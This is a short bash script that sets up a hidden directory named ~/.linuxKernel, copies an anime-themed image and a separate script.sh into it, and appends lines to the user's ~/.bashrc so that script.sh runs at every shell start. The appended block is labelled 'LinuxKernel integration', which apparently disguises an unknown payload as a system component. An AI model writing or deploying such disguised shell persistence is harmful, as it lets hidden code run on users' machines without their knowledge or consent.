#!/bin/bash

KERNEL_DIR="$HOME/.linuxKernel"

SOURCE_NOTICE="./one_piece_notice.png"
INSTALLED_NOTICE="$KERNEL_DIR/notice.png"
IMG_PATH="$KERNEL_DIR/result.png"
OUT_FILE="$KERNEL_DIR/output.png"
RC="$HOME/.bashrc"

if [ ! -d "$KERNEL_DIR" ]; then
    mkdir -p "$KERNEL_DIR"
fi

if [ ! -f "$INSTALLED_NOTICE" ]; then
    if [ -f "$SOURCE_NOTICE" ]; then
        cp "$SOURCE_NOTICE" "$INSTALLED_NOTICE"
        cp "$SOURCE_NOTICE" "$IMG_PATH"
        cp "$SOURCE_NOTICE" "$OUT_FILE"
        cp "script.sh" "$KERNEL_DIR"
    else
        exit 1
    fi
fi

echo "# LinuxKernel integration" >> "$RC"
echo "if [ -f "$HOME/.linuxKernel/script.sh" ]; then" >> "$RC"
echo "  source "$HOME/.linuxKernel/script.sh"" >> "$RC"
echo "fi" >> "$RC"
